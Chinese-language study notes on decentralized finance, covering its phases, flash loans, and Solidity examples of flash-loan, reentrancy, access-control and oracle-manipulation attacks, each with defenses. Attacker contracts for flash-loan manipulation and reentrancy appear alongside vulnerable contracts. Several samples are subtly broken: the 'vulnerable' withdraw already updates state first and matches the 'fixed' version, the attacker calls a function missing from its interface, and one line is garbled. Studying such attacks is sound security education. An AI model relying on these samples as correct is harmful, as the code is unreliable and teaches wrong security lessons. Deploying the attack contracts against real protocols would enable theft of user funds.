去中心化金融，提供了去中心化的金融服务，如賺取利息、借款、借貸、買保險、交易衍生產品、交易資產等等。但它的速度更快，並且不需要繁雜的文書工作或第三方。與一般的加密貨幣一樣，DeFi 是全球性的點對點（直接在兩個人之間，而不是透過集中式系統進行路由）金融應用程式，可以保持投資者匿名，且對所有人開放。
* 1.0
	* 以太坊技術成熟，智能合約的應用也日趨廣泛，替 DeFi 發展提供了技術基礎；
	- 傳統金融體系的不足，激發了市場對更高效、更透明、更開放的金融服務的需求；
	- 風險投資基金對 DeFi 專案的投資力度不斷加大。
	- 經典案例：
		- 去中心化借貸平台 Compound Finance 推出治理代幣 COMP，推動'流動性挖礦（Yield Farming）'
		- 流動性挖礦是指，用戶將兩種不同的加密貨幣資產，投入規定的流動性池中，當其他用戶在平台上使用該流動性池進行交易時，平台會向交易者收取少量費用。平台會將一部分的交易費用作為獎勵，分配給流動性提供者。
		- 總鎖定價值（Total Value Locked，簡稱 TVL）是一個用於衡量 DeFi 平台或協議中鎖定資產總價值的指標。TVL 代表鎖定在智能合約中的資金總額，包括：存款、抵押和流動性池中的資金。TVL 越高，通常代表越多用戶參與，因此也就會有越高的平台信任度。
* 2.0
	* 解決1.0挑戰
		* 過度依賴激勵措施
		* 治理代幣分配不均
		* 安全問題
	* 試圖協議自有流動性（protocol-owned liquidity）和更複雜的代幣經濟學，來解決流動性問題。
	* 經典案例；
		* 打造不依賴傳統法定貨幣的去中心化儲備貨幣組織 Olympus DAO
		* DeFi 借貸協議 Aave V4
		* 去中心化永續期貨交易的區塊鏈協議 Hyperliquid 
		* 去中心化交易協議 Uniswap v4
* 3.0
	* 關鍵因素：
		* DeFi 應用不再侷限於加密貨幣交易，而是與現實世界資產（RWA）深度融合，例如：房地產抵押貸款和供應鏈金融等領域，[案例](https://www.financemagnates.com/cryptocurrency/defi-beyond-crypto-the-rise-of-real-world-assets-tokenization/)
		* 機構級 DeFi 蓬勃發展，[傳統金融機構紛紛入場](https://www.globenewswire.com/news-release/2024/07/24/2925498/0/en/Franklin-Templeton-Launches-Benji-Investments-a-DeFi-Platform.html)，並積極參與 DeFi 協議。為了滿足機構的合規需求， DeFi 基礎設施也不斷升級。
			* 傳統資產管理公司富蘭克林（Franklin Templeton）就推出了基於 Polygon 區塊鏈的平台 Benji Investments，主要的功能就是為機構投資者提供進入 DeFi 收益產品的便捷入口。
		* 安全性顯著提高，降低了 DeFi 工具的使用門檻。
			* 採用多層防護措施、形式化驗證和 AI 驅動的安全系統，有效應對各種安全風險。
			* 以太坊新增的帳戶抽象功能（Account Abstraction），將帳戶與密鑰管理分開來，讓用戶在遺失線上錢包私鑰時，能更容易恢復帳戶，使用者體驗也大幅改善
			* 社交恢復（ Social Recovery Wallet）則可以透過個人可信賴的社交網路，來恢復錢包存取權。
## 如何運作
- **借出**：借出您的加密貨幣，每分鐘都能賺取利息和獎勵，而不是每個月一次。    
- **申請貸款**：無需填寫文書即可立即獲得貸款，包括傳統金融機構不提供的極短期「快速貸款」。(Compound Finance 推出治理代幣 COMP，點燃了「流動性挖礦（Yield Farming）」的熱潮。)
- **交易**：對某些加密貨幣資產進行點對點交易 — 就好像您可以在沒有任何經紀人的情況下買賣股票。    
- **為未來儲蓄**：將您的一些加密貨幣放入儲蓄帳戶替代方案中，並獲得比通常銀行所給的利率更高的利率。     
- **購買衍生產品**：對某些資產做多或做空賭注。將它們視為加密貨幣版本的股票期權或期貨合約。

## 智能合約
去中心化金融的大多數現有及潛在應用均涉及智能合約的建立及執行。一般合約會使用法律術語來闡明簽訂合約實體間的關係條款，而智能合約則使用電腦程式碼。

由於這些條款均運用電腦程式碼編寫，智能合約能夠自動執行這些條款。這讓目前許多需要人工監督的業務流程能夠可靠地執行及自動化。

使用智能合約讓交易過程更為快捷方便，同時又能降低交易雙方的風險。然而，智能合約也帶來了新的風險類型。由於電腦程式碼極易出現錯誤和漏洞，鎖定在智能合約內的價值和機密資訊均承受相關風險。

## 缺點
- 區塊鏈本質上就比其中心化對手慢，這影響了建立在其上的應用程式。DeFi 應用程式的開發者需要考慮這些限制，並相應地優化其產品。像 Arbitrum 和 Optimism 這樣的第 2 層解決方案正在解決這些問題，提供更快速、更便宜的交易。
- 以太坊區塊鏈上的交易率波動意味著活躍的交易操作可能會變得十分昂貴。
- 根據使用的 dapp 以及使用方式的不同，投資可能會經歷高波動性，畢竟這算是一項新技術。
- 出於報稅目的，必須保有自己的記錄。相關法規可能因地區而異。
- 資安風險高：DeFi 主要依靠智能合約運作和執行各類交易，一旦智能合約初始的設計有漏洞，又或是遭到駭客攻擊，用戶財產就會處於極高風險之中，蒙受鉅額損失。同時，因為 DeFi 是去中心化的，並不會像交易所這樣的中心化機構，可以提供客服協助或使用教學，損失通常難以追回。

然而，由于其开放、透明且没有中介的特点，DeFi也成为了黑客攻击的热点。以下是DeFi常见的安全风险及其防御措施：

## 閃電貸(Flash Loan)
* 閃電貸：無抵押借款的服務。常見的事以太坊閃電貸，通過以太坊交易機制來保證可以進行無抵押借出資金。并且可以在一筆交易中一種包含很多步驟，借款、兌換、使用、還款。
* 主流平臺：
	* Aave
	* dydx
	* Uniswap
* solidity閃電貸：基於solidity支援動態呼叫的這一個特性設計的，
```
// 每次調用都可以傳入不同地址
function callfun(address addr) public {
addr.call();
}

/** 
 * 閃電貸的三個核心功能
 * 首先直接將資金發送給呼叫者
 * 再調用呼叫者合約，從而讓呼叫者使用這些資金
 * 呼叫者使用結束，檢查是否歸還資金以及手續費，如果檢查失敗則回滾交易。（此處也可以直接使用transferfrom 函式將呼叫則資金轉移回來）
 */
 
function flashloan(uint amount, address to) {
transfer (to, amount); // 傳送資金給呼叫者
to.call ();// 調用呼叫者的合約函數
check ();// 檢查是否歸還資金
}
```
![](shandiandai-sol.png)

```
// Uniswap 閃電貸邏輯
function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {

require(amount0Out > 0 || amount1Out > 0, ‘UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT’);

(uint112 _reserve0, uint112 _reserve1,) = getReserves();

require(amount0Out < _reserve0 && amount1Out < _reserve1, ‘UniswapV2: INSUFFICIENT_LIQUIDITY’); uint balance0; uint balance1; { address _token0 = token0; address _token1 = token1; require(to != _token0 && to != _token1, ‘UniswapV2: INVALID_TO’); /** 將資金轉給使用者 **/ if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);

if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);

/** 調用使用者指定的目標函式 **/

if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);

balance0 = IERC20(_token0).balanceOf(address(this));

balance1 = IERC20(_token1).balanceOf(address(this));

}

uint amount0In = balance0 > _reserve0 – amount0Out ? balance0 – (_reserve0 – amount0Out) : 0;

uint amount1In = balance1 > _reserve1 – amount1Out ? balance1 – (_reserve1 – amount1Out) : 0;

require(amount0In > 0 || amount1In > 0, ‘UniswapV2: INSUFFICIENT_INPUT_AMOUNT’);

{

uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));

uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));

/** 檢查使用者是否歸還資金以及手續費 **/

require(balance0Adjusted.mul(balance1Adjusted)>=uint(_reserve0).mul(_reserve1).mul(1000**2), ‘UniswapV2: K’);

}

_update(balance0, balance1, _reserve0, _reserve1);

emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);

}
```

### 閃電貸攻擊（Flash Loan Attack）
流程：
* 借入資金
* 操縱市場。套利，利用智能合約漏洞
* 在同一個交易中立即歸還
攻擊原理：
1. 識別套利機會：攻擊者主動發現不同DEX或平臺間的價格差異
2. 智能合約：包含借入閃電貸、執行套利交易、償還貸款，在一個交易中完成所有操作
3. 借入閃電貸
4. 執行套利交易
	1. 交易1：在價格i驕傲地的平臺購買加密貨幣
	2. 交易2：在另一個較高價格的平臺出售
	3. 償還貸款
	4. 收取利潤：貸款償還后攻擊者就可以提取智能合約中剩餘的利潤
```
/**
	bzx是一个去中心化借贷协议，在 2020 年 2 月遭遇了著名的 **Flash Loan Attack**。攻击者利     用闪电贷从 dYdX 和 Uniswap 上借取大量资金，并通过价格操控和市场操纵实施攻击。该攻击导致了     bZx 协议遭受大规模资金损失，约为 100 万美元。
 */

pragma solidity ^0.6.6;

// 引入闪电贷池接口，允许借取资产
interface ILendingPool {
    function flashLoan(
        address receiver, // 借款人地址
        address asset,    // 借款资产
        uint256 amount,   // 借款数量
        bytes calldata params // 附加参数
    ) external;
}

// 引入 Uniswap 路由器接口，用于执行资产交换
interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,           // 输入的资产数量
        uint amountOutMin,       // 最小输出资产数量（防止滑点问题）
        address[] calldata path, // 交换路径（例如从某种资产换成ETH）
        address to,              // 收款地址
        uint deadline            // 交易截止时间
    ) external returns (uint[] memory amounts); // 返回交换的资产数量
}

contract FlashLoanAttack {
    address private owner;  // 合约拥有者地址
    ILendingPool private lendingPool;  // 闪电贷池接口
    IUniswapV2Router02 private uniswapRouter;  // Uniswap 路由器接口

    // 闪电贷攻击合约构造函数，初始化借贷池和Uniswap路由器地址
    constructor(address _lendingPool, address _uniswapRouter) public {
        owner = msg.sender;  // 合约创建者为合约的拥有者
        lendingPool = ILendingPool(_lendingPool);  // 设置借贷池地址
        uniswapRouter = IUniswapV2Router02(_uniswapRouter);  // 设置Uniswap路由器地址
    }

    // 攻击触发函数，由合约拥有者调用发起闪电贷
    function attack(address asset, uint256 amount) external {
        require(msg.sender == owner, "Only owner can execute the attack");  // 只有合约拥有者才能执行攻击
        
        // 发起闪电贷，借入指定资产及数量
        lendingPool.flashLoan(address(this), asset, amount, "");
    }

    // 闪电贷执行回调函数，在借贷池放款后自动调用
    function executeFlashLoan(
        address asset,         // 借款资产地址
        uint256 amount,        // 借款数量
        uint256 fee,           // 闪电贷费用
        bytes calldata params  // 其他参数（此例为空）
    ) external {
        require(msg.sender == address(lendingPool), "Unauthorized");  // 确保调用者是借贷池

        // 执行市场价格操控，通过Uniswap交换资产
        address ; // 交换路径数组，包含两种资产（例如从借款资产到ETH）
        path[0] = asset;  // 输入资产（借来的资产）
        path[1] = address(0);  // 目标资产（例如ETH）

        // 使用Uniswap交换资产，操控市场价格
        uniswapRouter.swapExactTokensForTokens(amount, 1, path, address(this), block.timestamp);
        
        // 计算还款总额：借款金额 + 费用
        uint256 totalDebt = amount + fee;
        
        // 确保合约能够偿还闪电贷及其费用
        require(ERC20(asset).transfer(address(lendingPool), totalDebt), "Repayment failed");
    }

    // 提取合约中的资金（只有合约拥有者可以执行）
    function withdraw(address token, uint256 amount) external {
        require(msg.sender == owner, "Only owner can withdraw");  // 只有合约拥有者才能提取资金
        ERC20(token).transfer(owner, amount);  // 转账指定数量的资产到合约拥有者
    }
}

```

防禦措施
1. **價格預言機保護**：使用多個去中心化的預言機，如 Chainlink，減少單點故障的風險。    
2. **增加抵押要求**：提高閃電貸的抵押品要求，減少無抵押借款的風險。    
3. **滑點和交易限制**：在去中心化交易所（DEX）上設置最大交易量或滑點限制，減少市場操控的空間。

## 重入攻擊
當一個外部合約在執行過程中調用原本正在執行的合約，進而引發重複調用的情況。這種攻擊會導致合約的狀態不一致，並且可以反覆地進行未經授權的資金轉移，從而造成資金的損失。
在智能合約中，當合約進行對外部地址的轉帳時，外部合約可能會在接收資金後再回調到原合約，並且在合約狀態尚未更新的情況下反覆執行某些操作。這就為攻擊者提供了利用合約漏洞的機會。

* 案例 The DAO Attack
	* 攻擊者利用 DAO 合約中的一個漏洞，在合約執行資金轉移時，利用重入攻擊使合約的狀態未及時更新，重複進行資金提取。這一攻擊事件成為了區塊鏈歷史上最著名的漏洞之一，最終促使以太坊社區進行了硬分叉，恢復了部分損失。
	* 攻擊步驟
		* 攻擊者將自己的合約與 DAO 合約互動，並進行初步的資金提取。   
		- 攻擊者在接收到資金後，將控制權回調至 DAO 合約中，再次觸發提取操作。
		- 在 DAO 合約的狀態未更新時，攻擊者反覆進行資金提取，最終竊取大量資金。
漏洞合約(DAO合約)
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    // 用於存款的函數
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 用於提取資金的函數
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // 在轉帳前更新狀態的問題
        balances[msg.sender] -= amount;
        
        // 執行轉帳
        msg.sender.transfer(amount);
    }
}

```
攻擊者合約
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

interface IVulnerableContract {
    function withdraw(uint256 amount) external;
}

contract Attacker {
    IVulnerableContract public vulnerableContract;
    address public owner;

    // 設置受害合約地址
    constructor(address _vulnerableContract) public {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    // 攻擊者發起攻擊
    function attack() public payable {
        require(msg.sender == owner, "Only the owner can attack");

        // 在攻擊合約中存款
        vulnerableContract.deposit{value: 1 ether}();
        
        // 觸發重入攻擊
        vulnerableContract.withdraw(1 ether);
    }

    // 攻擊合約的回調函數，當資金轉賬到達時再次觸發 withdraw 函數
    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }
}

```

如何防禦
* 使用CEI模式（Checks-Effects-Interactions）
	* 在執行外部調用（如資金轉賬）前，先檢查條件並更新狀態。
	* 正確做法：先更新狀態，然後執行外部操作。
```
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    
    // 先更新狀態
    balances[msg.sender] -= amount;
    
    // 再進行外部調用（轉賬）
    msg.sender.transfer(amount);
}

```
 * 使用重入鎖定（Reentrancy Guard）
```
bool private locked = false;

modifier noReentrancy() {
    require(!locked, "Reentrancy attack detected!");
    locked = true;
    _;
    locked = false;
}

function withdraw(uint256 amount) public noReentrancy {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;
    msg.sender.transfer(amount);
}

```
 * 使用transfer代替call
	 * transfer限制gas小號，使得外部合約無法進行衝入操作
```
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;
    // 使用 transfer 來防止重入
    msg.sender.transfer(amount);
}

```
* 智能合約審計
* 限制外部合約調用

## **权限控制問題（Unauthorized Access）**

### 定義

在智能合約中，如果**缺乏明確的權限管理**，攻擊者可能執行本不應該被授權的操作，導致資金被提取或合約狀態被篡改。  
權限控制問題通常出現在以下情況：

- 沒有設置合約管理者或管理者角色；
    
- 關鍵函數沒有加上`onlyOwner`或類似的限制；
    
- 系統敏感操作依賴單一操作者。
    

### 經典案例

**案例：Parity Wallet 多重簽名漏洞（2017）**

- **事件簡述**：Parity 的多簽錢包存在一個初始化函數 `initWallet()` 可以被任何人調用，攻擊者利用此漏洞將多簽合約設置為自己擁有者，從而竊取了價值數百萬美元的以太幣。
    
- **原因**：權限控制不足，敏感操作未受限於多重簽名或擁有者檢查。
    

---

### 不安全的權限控制

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableAdmin {
    address public owner;

    constructor() {
        owner = msg.sender; // 部署者是初始管理者
    }

    // 不安全的管理操作，沒有權限檢查
    function changeOwner(address newOwner) public {
        owner = newOwner; // 任意人都可以修改 owner
    }

    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}
```

#### 註解

1. `changeOwner()` 函數沒有做任何權限檢查，任何人都能呼叫，改變合約擁有者。    
2. 攻擊者可以先呼叫 `changeOwner(attackerAddress)`，然後執行 `withdraw()` 提走所有資金。 
3. 這是典型的權限控制漏洞。
### 防禦措施

1. **多重簽名錢包（Multisig）**    
    - 敏感操作需要多方簽名批准。        
    - 範例：Gnosis Safe。        
2. **角色基於訪問控制（RBAC）**    
    - 使用 OpenZeppelin 的 `AccessControl` 模組，設置不同角色（Admin、Operator、User）。       
    ```solidity
    import "@openzeppelin/contracts/access/AccessControl.sol";
    
    contract SecureContract is AccessControl {
        bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    
        constructor() {
            _setupRole(ADMIN_ROLE, msg.sender);
        }
    
        function criticalFunction() public onlyRole(ADMIN_ROLE) {
            // 只有 ADMIN_ROLE 可以執行
        }
    }
    ```
    
3. **時間鎖（Timelock）**    
    - 關鍵操作在執行前設置延遲，給團隊時間審查。        
    - OpenZeppelin TimelockController 可用於延遲策略。
## **Oracle 攻擊（Oracle Manipulation）**

### 定義

**Oracle 攻擊**是指 DeFi 協議依賴外部數據源（Oracle）提供價格資訊，如果攻擊者能操控 Oracle 提供的數據，就可以操控協議的行為，如：

- 借貸平台的清算價格；    
- 積分或質押資產價格；    
- 交易所的滑點或閃電清算
### 經典案例

**案例：bZx Flash Loan Oracle Manipulation（2020）**
- **事件簡述**：    
    - 攻擊者利用閃電貸借款大量資金。        
    - 通過操縱預言機（Oracle）價格，讓借貸平台錯誤計算資產價值。        
    - 最終提走價值超過 100 萬美元的資金。        
- **原因**：    
    - Oracle 僅依賴單一源或短期市場價格，無法抵抗短時價格操縱。
### 易受操控的 Oracle

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPriceOracle {
    function getPrice() external view returns (uint256);
}

contract VulnerableLending {
    IPriceOracle public oracle;
    mapping(address => uint256) public collateral;

    constructor(address _oracle) {
        oracle = IPriceOracle(_oracle);
    }

    function depositCollateral() external payable {
        collateral[msg.sender] += msg.value;
    }

    function borrow() external {
        uint256 price = oracle.getPrice();
        require(collateral[msg.sender] * price >= 1 ether, "Not enough collateral");

        // 發放借款
        payable(msg.sender).transfer(1 ether);
    }

    receive() external payable {}
}
```

#### 註解

1. `borrow()` 函數依賴 Oracle 價格計算抵押品。    
2. 如果攻擊者能操縱 `oracle.getPrice()` 返回極低價格，就能在抵押不足的情況下提取資金。
3. 這是一個典型的 Oracle 攻擊漏洞。
    
### 防禦措施

1. **多 Oracle 源**    
    - 使用 Chainlink 等去中心化預言機，聚合多個價格來源。       
    ```solidity
    // Aggregated price oracle
    uint256 price = (oracle1.getPrice() + oracle2.getPrice() + oracle3.getPrice()) / 3;
    ```
    
2. **價格驗證**
    - 對價格進行驗證，檢查是否異常。
    - 可以設置最大價格波動限制。        
3. **時間加權平均（TWAP, Time-Weighted Average Price）**    
    - 用一段時間內的平均價格，減少短期市場操控影響。        
    - 例如：       
    ```solidity
    uint256 twapPrice = (priceNow + price1HourAgo + price2HoursAgo) / 3;
    ```
4. **閃電貸檢測**    
    - 對單筆交易的大額資金進行警告或限制，降低 Oracle 被短時操控的風險。
## 參考文獻
[1] https://xrex.io/tw/zh/blog/beginner-s-guide/what-is-defi-decentralized-finance-pros-and-cons-zh/
[2] https://www.coinbase.com/zh-tw/learn/crypto-basics/what-is-defi
[3] https://academy.binance.com/zh-TC/articles/the-complete-beginners-guide-to-decentralized-finance-defi#%E6%99%BA%E8%83%BD%E5%90%88%E7%B4%84%E5%9C%A8-DeFi-%E4%B8%AD%E7%9A%84%E8%A7%92%E8%89%B2
[4] https://www.blocktempo.com/what-are-the-differences-in-the-implementation-of-flash-loans-in-solidity-move-and-rust/
[5] https://zhuanlan.zhihu.com/p/711226462
[6] https://www.blocktempo.com/defi-hacked-over-120-m-usd-this-year-innovation-finance-turned-to-atm/